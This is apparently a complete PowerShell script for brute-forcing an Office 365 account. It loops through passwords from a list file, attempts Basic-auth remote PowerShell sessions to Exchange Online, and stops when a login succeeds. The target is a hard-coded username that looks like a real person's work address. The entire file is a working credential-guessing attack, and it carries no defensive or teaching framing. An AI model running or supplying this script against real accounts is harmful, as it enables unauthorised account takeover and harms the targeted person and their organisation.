#links
#https://techcommunity.microsoft.com/t5/Office-365/cred-Get-Credential-without-asking-for-prompts-in-powershell/td-p/483274
#https://cssi.us/office-365-brute-force-powershell/

# Login to O365

# Account you wish to brute force
#$username = “admin@microsoft.com”
$username = 'davide.guglielmi@curios-it.eu'

# Attempt logins using every password in your password list
$x=0
foreach ($password in get-content password_list.txt){
    $x=$x+1;
    Write-Host 'Attempt' $x
    Write-Host 'Trying password' $password
    $password = $password | ConvertTo-SecureString -asPlainText -Force
    $O365Cred = New-Object System.Management.Automation.PSCredential($username,$password)

    $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $O365Cred -Authentication Basic -AllowRedirection

    Import-PSSession $Session

    #Check a command. If the command has output that means your password is good.
    $Domains = get-user
    if ($Domains) {
        exit
    }
}